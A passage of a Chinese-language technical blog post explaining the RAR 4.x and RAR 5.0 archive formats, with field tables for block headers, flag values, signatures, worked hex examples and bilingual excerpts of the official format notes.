ADD_SIZE。</p></blockquote><p><strong><code>块类型：</code></strong></p><blockquote><ul><li><code>HEAD_TYPE = 0x72</code>  - MARK_HEAD(标记块)</li><li><code>HEAD_TYPE = 0x73</code>  - MAIN_HEAD(压缩文件头)</li><li><code>HEAD_TYPE = 0x74</code>  - FILE_HEAD(文件头)</li><li><code>HEAD_TYPE = 0x75</code>  - COMM_HEAD(旧风格的注释头)</li><li><code>HEAD_TYPE = 0x76</code>  - AV_HEAD(旧风格的授权信息块/用户身份信息块)</li><li><code>HEAD_TYPE = 0x77</code>  - SUB_HEAD(旧风格的子块)</li><li><code>HEAD_TYPE = 0x78</code>  -     PROTECT_HEAD(旧风格的恢复记录)</li><li><code>HEAD_TYPE = 0x79</code>  - SIGN_HEAD(旧风格的授权信息块/用户身份信息块)</li><li><code>HEAD_TYPE = 0x7A</code>  - NEWSUB_HEAD(子块)</li><li><code>HEAD_TYPE = 0x7B</code>  - ENDARC_HEAD(结束块)</li></ul></blockquote><h4 id="2-1-1、标记块-MARK-HEAD"><a href="#2-1-1、标记块-MARK-HEAD" class="headerlink" title="2.1.1、标记块( MARK_HEAD )"></a>2.1.1、标记块( MARK_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">总是0x6152</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x72</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">总是0x1A21</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小 = 0x0007,即7个字节</td></tr></tbody></table><p>&emsp;&emsp;所以这里标记块的大小固定是7 个字节，且是一个固定的字节序列。<code>标记块</code>也称为<code>Magic number</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/MARK_HEAD.jpg" alt="标记块"></p><h4 id="2-1-2、压缩文件头-MAIN-HEAD"><a href="#2-1-2、压缩文件头-MAIN-HEAD" class="headerlink" title="2.1.2、压缩文件头( MAIN_HEAD )"></a>2.1.2、压缩文件头( MAIN_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">HEAD_TYPE到RESERVED2的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x73</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记：<br> <code>0x0001</code> - MHD_VOLUME: 卷属性(压缩文件卷) <br> <code>0x0002</code> - MHD_COMMENT: 压缩文件注释存在，RAR 3.x使用单独的注释块，不设置这个标记。 <br> <code>0x0004</code> - MHD_LOCK: 压缩文件锁定属性 <br> <code>0x0008</code> - MHD_SOLID: 固实属性(固实压缩文件) <br> <code>0x0010</code> - MHD_NEWNUMBERING: 新的卷命名法则(‘volname.partN.rar’) <br> <code>0x0020</code> - MHD_AV: 用户身份信息存在，RAR 3.x使用单独的用户身份信息块，不设置这个标记。 <br> <code>0x0040</code> - MHD_PROTECT: 恢复记录存在 <br> <code>0x0080</code> - HD_PASSWORD: 块头被加密 <br> <code>0x0100</code> - MHD_FIRSTVOLUME: 第一卷(只有RAR3.0及以后版本设置) <br> <code>0x0200</code> - MHD_ENCRYPTVER: <br> HEAD_FLAGS中的其他位保留用于内部使用。</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">压缩文件头总大小（包括压缩文件注释）</td></tr><tr><td style="text-align:left">RESERVED1</td><td style="text-align:center">2</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">RESERVED2</td><td style="text-align:center">4</td><td style="text-align:left">保留</td></tr></tbody></table><p>&emsp;&emsp;对于<code>压缩文件头</code>里的<code>位标记</code>，如果它的第9位(从左到右)被置1，块头被加密，也就是通常所说的<code>加密文件名</code>，打开这样加密的RAR文件时，需要先输入密码才能看到压缩包内的文件列表。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/MAIN_HEAD.jpg" alt="压缩文件头"></p><p>&emsp;&emsp;这里头类型是0x73表示是<code>压缩文件头块</code>，位标记为0x0000未有位被置1，如果<code>块头被加密</code>则位标记应为0x0080，<code>文件头大小</code>为0x000D，所以这个<code>压缩文件头块</code>占用13 个字节，保留字节用0x00 填充。</p><h4 id="2-1-3、文件头-FILE-HEAD"><a href="#2-1-3、文件头-FILE-HEAD" class="headerlink" title="2.1.3、文件头( FILE_HEAD )"></a>2.1.3、文件头( FILE_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">&nbsp; 长度(byte) &nbsp;</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE到FILEATTR的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x74</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记: <br> <code>0x0001</code> - LHD_SPLIT_BEFORE: 文件从上一卷继续 <br> <code>0x0002</code> - LHD_SPLIT_AFTER: 文件从后一卷继续 <br> <code>0x0004</code> - LHD_PASSWORD: 文件使用密码加密 <br> <code>0x0008</code> - LHD_COMMENT: 文件注释存在，RAR 3.x使用独立的注释块，不设置这个标记。 <br> <code>0x0010</code> - LHD_SOLID: 前一文件信息被使用(固实标记) (对于RAR 2.0 和以后版本) <br> &emsp;&emsp;7 6 5 位(对于RAR 2.0和以后版本) <br> &emsp;&emsp;0 0 0 - 字典大小 64KB <br> &emsp;&emsp;0 0 1 - 字典大小 128KB <br> &emsp;&emsp;0 1 0 - 字典大小 256KB <br> &emsp;&emsp;0 1 1 - 字典大小 512KB <br> &emsp;&emsp;1 0 0 - 字典大小 1024KB <br> &emsp;&emsp;1 0 1 - 字典大小 2048KB <br> &emsp;&emsp;1 1 0 - 字典大小 4096KB <br> &emsp;&emsp;1 1 1 - 文件作为字典 <br> <code>0x0100</code> - LHD_LARGE: HIGH_PACK_SIZE和HIGH_UNP_SIZE结构存在。这些结构仅用在非常大(大于2GB)的文档，对于小文件这些结构不存在。 <br> <code>0x0200</code> - LHD_UNICODE: FILE_NAME是用0隔开的包含普通的和Unicode编码的文件名。所以NAME_SIZE字段的值等于普通文件名的长度加Unicode编码文件名的长度再加1。如果此标记存在，但是FILE_NAME不包含0字节，它意味文件名使用UTF-8编码。 <br> <code>0x0400</code> - LHD_SALT: 文件头在文件名后包含附加的8byte，它对于增加加密的安全性是必需的。(所谓的’Salt’)。 <br> <code>0x0800</code> - LHD_VERSION: 版本标记。它是旧文件版本，版本号作为’;n’附加到文件名后。 <br> <code>0x1000</code> - LHD_EXTTIME: 扩展时间区域存在。  <br> <code>0x2000</code> - LHD_EXTFLAGS: <br> <code>0x8000</code> - 此位总被设置，所以完整的块的大小是HEAD_SIZE + PACK_SIZE(如果<code>0x100</code>位被设置，再加上HIGH_PACK_SIZE)</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">文件头的全部大小(包含文件名和注释)</td></tr><tr><td style="text-align:left">PACK_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">已压缩文件大小</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">未压缩文件大小</td></tr><tr><td style="text-align:left">HOST_OS</td><td style="text-align:center">1</td><td style="text-align:left">保存压缩文件使用的操作系统 <br> <code>0x00</code> - MS DOS <br> <code>0x01</code> - OS/2 <br> <code>0x02</code> - Win32 <br> <code>0x03</code> - Unix <br> <code>0x04</code> - Mac OS <br> <code>0x05</code> - BeOS</td></tr><tr><td style="text-align:left">FILE_CRC</td><td style="text-align:center">4</td><td style="text-align:left">文件CRC</td></tr><tr><td style="text-align:left">FTIME</td><td style="text-align:center">4</td><td style="text-align:left">MS DOS标准格式的日期和时间</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">解压文件所需要最低RAR版本，版本编码方法：10 * 主版本 + 副版本。</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方式： <br> <code>0x30</code> - 存储 <br> <code>0x31</code> - 最快压缩 <br> <code>0x32</code> - 较快压缩 <br> <code>0x33</code> - 标准压缩 <br> <code>0x34</code> - 较好压缩 <br> <code>0x35</code> - 最好压缩</td></tr><tr><td style="text-align:left">NAME_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">文件名大小</td></tr><tr><td style="text-align:left">ATTR</td><td style="text-align:center">4</td><td style="text-align:left">文件属性</td></tr><tr><td style="text-align:left">HIGH_PACK_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选值，<code>已压缩文件大小</code>64位值的高4字节。只HEAD_FLAGS中的<code>0x100</code>位被设置才存在。</td></tr><tr><td style="text-align:left">HIGH_UNP_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选值，<code>未压缩文件大小</code>64位值的高4字节。只有HEAD_FLAGS中的<code>0x100</code>位被设置才存在。</td></tr><tr><td style="text-align:left">FILE_NAME</td><td style="text-align:center">NAME_SIZE</td><td style="text-align:left">文件名 - NAME_SIZE字节大小字符串</td></tr><tr><td style="text-align:left">SALT</td><td style="text-align:center">8</td><td style="text-align:left">可选值，如果(HEAD_FLAGS &amp; 0x400)!= 0，则存在</td></tr><tr><td style="text-align:left">EXT_TIME</td><td style="text-align:center">可变大小</td><td style="text-align:left">可选值，扩展时间区域，如果(HEAD_FLAGS &amp; 0x1000)!= 0，则存在</td></tr></tbody></table><p><strong><code>实例1：</code></strong><br><img src="/resources/2020/RAR_Format/FILE_HEAD.jpg" alt="文件头1"></p><p><strong><code>实例2：</code></strong><br><img src="/resources/2020/RAR_Format/FILE_HEAD1.jpg" alt="文件头2"></p><p>&emsp;&emsp;在这个块中，存在<code>两个CRC值</code>，一个是文件头块中从<code>块类型</code>到<code>文件名</code>这38(实例1)或40(实例2)个字节的校验，后一个则是压缩包中所含<code>文件的CRC校验</code>，解压时，会计算解压后生成文件的CRC值，如果等于这里的CRC，则解压完成，如果不同，则报错中断。<br>&emsp;&emsp;位标记<code>0x9020</code>(10010000 00100000B) = 0x0020 || 0x1000 || 0x8000，<code>0x0020</code>(字典大小 128KB)、<code>0x1000</code>(扩展时间区域存在)、<code>0x8000</code>(此位总被设置)。</p><h4 id="2-1-4、结尾块-ENDARC-HEAD"><a href="#2-1-4、结尾块-ENDARC-HEAD" class="headerlink" title="2.1.4、结尾块( ENDARC_HEAD )"></a>2.1.4、结尾块( ENDARC_HEAD )</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到HEAD_SIZE 的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x7B</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">结尾块大小</td></tr></tbody></table><p>&emsp;&emsp;与标记块类似的是，<code>结尾块</code>也是一个固定字节串的块，依次是<code>C4 3D 7B 00 40 07 00</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/END_HEAD.jpg" alt="结尾块"></p><p>&emsp;&emsp;<code>前一个文件块起始位置偏移</code>为81，而<code>前一个文件块的大小</code>是HEAD_SIZE + PACK_SIZE(0x002F + 0x153A = 0x1569) = 5481byte。所以<code>结尾块的偏移</code>为5481 + 81 = 5562。</p><h4 id="2-1-5、旧风格的块类型"><a href="#2-1-5、旧风格的块类型" class="headerlink" title="2.1.5、旧风格的块类型"></a>2.1.5、旧风格的块类型</h4><p>&emsp;&emsp; 除以上格式块以外，还存在一些旧风格的块类型，不过在新的版本中已经不存在了。</p><p><strong><code>旧风格的注释头块：</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到COMM_CRC 的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x75</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">注释头大小</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">未压缩注释大小</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">提取注释的RAR最低版本</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方法</td></tr><tr><td style="text-align:left">COMM_CRC</td><td style="text-align:center">2</td><td style="text-align:left">注释CRC</td></tr><tr><td style="text-align:left">COMMENT</td><td style="text-align:center">N</td><td style="text-align:left">注释正文</td></tr></tbody></table><p><strong><code>旧风格的授权信息块/用户身份信息块：</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">从HEAD_TYPE 到HEAD_SIZE的CRC校验值</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x76</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小</td></tr><tr><td style="text-align:left">INFO</td><td style="text-align:center">N</td><td style="text-align:left">授权信息/用户身份信息正文</td></tr></tbody></table><p><strong><code>旧风格的子块：</code></strong><br>&emsp;&emsp; 在压缩文件中<code>任意文件头块</code>后面都可以附加一个<code>子块</code>。这个子块依赖于它前面的这个<code>主块</code>。当更新时新版本的RAR压缩包可能会删除或者移动这个子块。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">块CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x77</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">总块大小</td></tr><tr><td style="text-align:left">DATA_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">总数据块大小</td></tr><tr><td style="text-align:left">SUB_TYPE</td><td style="text-align:center">2</td><td style="text-align:left">子块类型</td></tr><tr><td style="text-align:left">RESERVED</td><td style="text-align:center">1</td><td style="text-align:left">保留字段，必须为0</td></tr><tr><td style="text-align:left">其余字段</td><td style="text-align:center"></td><td style="text-align:left">由SUB_TYPE 决定其余字段类型</td></tr></tbody></table><p>&emsp;&emsp; 以<code>SUB_TYPE</code>为0x100为例，0x100定义子块类型为<code>扩展属性类型</code>，一般用于压缩一些文件属性信息较详细的文件。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">块CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">0x77</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">位标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">总块大小</td></tr><tr><td style="text-align:left">DATA_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">总数据块大小</td></tr><tr><td style="text-align:left">SUB_TYPE</td><td style="text-align:center">2</td><td style="text-align:left">子块类型，定义子块为扩展属性类型</td></tr><tr><td style="text-align:left">RESERVED</td><td style="text-align:center">1</td><td style="text-align:left">保留字段，必须为0。以上为子块中固定格式</td></tr><tr><td style="text-align:left">UNP_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">未压缩扩展属性大小。以下为扩展属性附加字段。</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">提取扩展属性的RAR最低版本</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方式</td></tr><tr><td style="text-align:left">EA_CRC</td><td style="text-align:center">4</td><td style="text-align:left">扩展属性CRC</td></tr></tbody></table><h3 id="2-2、RAR-5-文件格式分析"><a href="#2-2、RAR-5-文件格式分析" class="headerlink" title="2.2、RAR 5+文件格式分析"></a>2.2、RAR 5+文件格式分析</h3><blockquote><p><strong><code>参考资料：</code></strong><br>1、<a href="https://www.rarlab.com/technote.htm" target="_blank" rel="noopener">https://www.rarlab.com/technote.htm</a></p></blockquote><p>&emsp;&emsp;Here we describe basic data structures of archive format introduced in RAR 5.0. If you need information about algorithms or more detailed information on data structures, please use UnRAR source code.<br>&emsp;&emsp;在这里，我们描述了<code>RAR 5.0</code>中引入的存档格式的<code>基本数据结构</code>。如果您需要有关算法的信息或有关数据结构的更多详细信息，请使用<code>UnRAR</code>源代码。</p><p><strong><code>实例环境：</code></strong></p><div align="left"><img src="/resources/2020/RAR_Format/env0.jpg" align:"left"="" width="50%" height="50%" alt="例子RAR文件环境0"><img src="/resources/2020/RAR_Format/env5.jpg" align:"right"="" width="50%" height="50%" alt="例子RAR文件环境1"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env1.jpg" align:"left"="" width="50%" height="50%" alt="例子RAR文件环境2"><img src="/resources/2020/RAR_Format/env2.jpg" align:"right"="" width="50%" height="50%" alt="例子RAR文件环境3"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env3.jpg" width="50%" height="50%" alt="例子RAR文件环境4"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env4.jpg" width="80%" height="60%" alt="例子RAR文件环境5"></div><p>设置的密码<code>未加密文件名</code>。</p><h4 id="2-2-1、Data-types-数据类型"><a href="#2-2-1、Data-types-数据类型" class="headerlink" title="2.2.1、Data types(数据类型)"></a>2.2.1、Data types(数据类型)</h4><p><strong><code>vint</code></strong><br>&emsp;&emsp;Variable length integer. Can include one or more bytes, where lower 7 bits of every byte contain integer data and highest bit in every byte is the continuation flag. If highest bit is 0, this is the last byte in sequence. So first byte contains 7 least significant bits of integer and continuation flag. Second byte, if present, contains next 7 bits and so on.<br>&emsp;&emsp;<code>可变长度</code>整数。可以包含<code>一个</code>或<code>多个</code>字节，其中每个字节的<code>低7位</code>包含整数数据，而每个字节中的<code>最高位</code>是连续标志。如果<code>最高位为0</code>，则这是序列中的最后一个字节。因此，第一个字节包含<code>低位7个有效位的整数</code>和<code>连续标志</code>。第二个字节（如果存在）包含下一个7位，依此类推。<br>&emsp;&emsp;Currently RAR format uses vint to store up to 64 bit integers, resulting in 10 bytes maximum. This value may be increased in the future if necessary for some reason.<br>&emsp;&emsp;当前的RAR格式使用<code>vint</code>最多存储<code>64位</code>整数，所以<code>vint</code>最大可以包含<code>10个字节</code>。如果出于某种原因，将来可能会增加此值。<br>&emsp;&emsp;Sometimes RAR needs to pre-allocate space for vint before knowing its exact value. In such situation it can allocate more space than really necessary and then fill several leading bytes with 0x80 hexadecimal, which means 0 with continuation flag set.<br>&emsp;&emsp;有时，RAR需要在知道确切值之前为<code>vint</code>预先分配空间。在这种情况下，它可以分配<code>超出</code>实际需要的空间，然后用<code>0x80</code>十六进制填充几个前导字节，这意味着设置了<code>连续标志</code>。</p><p><strong><code>byte</code></strong>, <strong><code>uint16</code></strong>, <strong><code>uint32</code></strong>, <strong><code>uint64</code></strong><br>Byte, 16-, 32-, 64- bit unsigned integer in little endian format.<br><code>Byte</code>，<code>16bit</code>、<code>32bit</code>、<code>64bit</code>的无符号整型使用的都是<code>小端存储格式</code>。</p><p><strong><code>Variable length data(可变长度的数据)</code></strong><br>We use ellipsis … to denote variable length data areas.<br>我们使用<code>省略号(...)</code>表示<code>可变长度</code>的数据区域。</p><p><strong><code>Hexadecimal values(十六进制值)</code></strong><br>We use 0x prefix to define hexadecimal values, such as 0xf000.<br>我们使用0x前缀定义十六进制值，例如<code>0xf000</code>。</p><h4 id="2-2-2、General-archive-structure-通用压缩文档结构"><a href="#2-2-2、General-archive-structure-通用压缩文档结构" class="headerlink" title="2.2.2、General archive structure(通用压缩文档结构)"></a>2.2.2、General archive structure(通用压缩文档结构)</h4><p><strong><code>General archive block format(通用压缩文档块格式)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Extra area</code>”字段。在当前的实现中，该字段不得超过<code>3个字节</code>，从而导致最大的头大小为<code>2MB</code>。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left">压缩文档头的类型。可能的值为：<br> &emsp;&emsp;<code>0x01</code> - 压缩文档头。<br> &emsp;&emsp;<code>0x02</code> - 文件头。<br> &emsp;&emsp;<code>0x03</code> - 服务头。<br> &emsp;&emsp;<code>0x04</code> - 压缩文档加密头。<br> &emsp;&emsp;<code>0x05</code> - 结尾块。</td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域的大小。仅当设置了<code>0x02</code>头标志时才存在。</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">当前块类型专用的字段。有关详细信息，请参见具体块类型描述。</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域。仅当设置了<code>0x02</code>头标志时才存在。用于存储大量数据，例如压缩文件数据。不包括“<code>Header CRC</code>”和“<code>Header size</code>”字段。</td></tr></tbody></table><p><strong><code>General extra area format(通用扩展区域格式)</code></strong><br>Extra area can include one or more records having the following format:<br>扩展区域可以包含一个或多个具有以下格式的记录：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>记录类型</code>。不同的压缩文档块具有不同的关联的扩展区域记录类型。阅读具体的压缩文档块描述以获取详细信息。将来可以添加新的记录类型，因此需要跳过未知的记录类型而不中断操作。</td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">…</td><td style="text-align:left"><code>记录相关数据</code>。如果记录仅由Size和Type组成，则可能会丢失。</td></tr></tbody></table><p><strong><code>General archive layout(通用压缩文档布局)</code></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Self-extracting module(optional)：自解压模块(可选的)</span><br><span class="line">RAR 5.0 signature：RAR5.0签名</span><br><span class="line">Archive encryption header(optional)：压缩文档加密头(可选的)</span><br><span class="line">Main archive header：压缩文档头</span><br><span class="line">Archive comment service header(optional)：压缩文档注释服务头(可选的)</span><br><span class="line"></span><br><span class="line">File header 1：文件头1</span><br><span class="line">Service headers(NTFS ACL, streams, etc.)<span class="keyword">for</span> preceding file(optional)：前一个文件的服务头(可选的)</span><br><span class="line">...</span><br><span class="line">File header N：文件头N</span><br><span class="line">Service headers(NTFS ACL, streams, etc.)<span class="keyword">for</span> preceding file(optional)：前一个文件的服务头(可选的)</span><br><span class="line"></span><br><span class="line">Recovery record(optional)：恢复记录(可选的)</span><br><span class="line">End of archive header：结尾块</span><br></pre></td></tr></table></figure></p><h4 id="2-2-3、Archive-blocks-压缩文档块"><a href="#2-2-3、Archive-blocks-压缩文档块" class="headerlink" title="2.2.3、Archive blocks(压缩文档块)"></a>2.2.3、Archive blocks(压缩文档块)</h4><h5 id="2-2-3-1、Self-extracting-module-SFX-自解压模块"><a href="#2-2-3-1、Self-extracting-module-SFX-自解压模块" class="headerlink" title="2.2.3.1、Self-extracting module (SFX)(自解压模块)"></a>2.2.3.1、<strong><code>Self-extracting module (SFX)(自解压模块)</code></strong></h5><p>&emsp;&emsp;Any data preceding the archive signature. Self-extracting module size and contents is not defined. At the moment of writing this documentation RAR assumes the maximum SFX module size to not exceed 1 MB, but this value can be increased in the future.<br>&emsp;&emsp;<code>压缩文档签名</code>之前的所有数据。<code>自解压模块</code>的大小和内容未定义。在撰写本文档时，RAR假定<code>SFX模块</code>的最大大小不超过1 MB，但是以后可以增加该值。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/SFX1.jpg" alt="自解压模块头"><br><img src="/resources/2020/RAR_Format/SFX2.jpg" alt="自解压模块尾"></p><h5 id="2-2-3-2、RAR-5-0-signature-RAR5-0签名"><a href="#2-2-3-2、RAR-5-0-signature-RAR5-0签名" class="headerlink" title="2.2.3.2、RAR 5.0 signature(RAR5.0签名)"></a>2.2.3.2、<strong><code>RAR 5.0 signature(RAR5.0签名)</code></strong></h5><p>&emsp;&emsp;RAR 5.0 signature consists of 8 bytes: 0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00. You need to search for this signature in supposed archive from beginning and up to maximum SFX module size. Just for comparison this is RAR 4.x 7 byte length signature: 0x52 0x61 0x72 0x21 0x1A 0x07 0x00.<br>&emsp;&emsp;<code>RAR 5.0签名</code>由8个字节组成：<code>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00</code>。您需要从假想的压缩文档中搜索该签名，从开始到最大SFX模块大小。只是为了比较，这是<code>RAR 4.x</code> 7字节长度的签名：<code>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/RAR 5.0 signature.jpg" alt="RAR 5.0签名"></p><h5 id="2-2-3-3、Archive-encryption-header-压缩文档加密块"><a href="#2-2-3-3、Archive-encryption-header-压缩文档加密块" class="headerlink" title="2.2.3.3、Archive encryption header(压缩文档加密块)"></a>2.2.3.3、<strong><code>Archive encryption header(压缩文档加密块)</code></strong></h5><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Check value</code>”字段的CRC32校验码。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Check value</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x04</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Encryption version</td><td style="text-align:center">vint</td><td 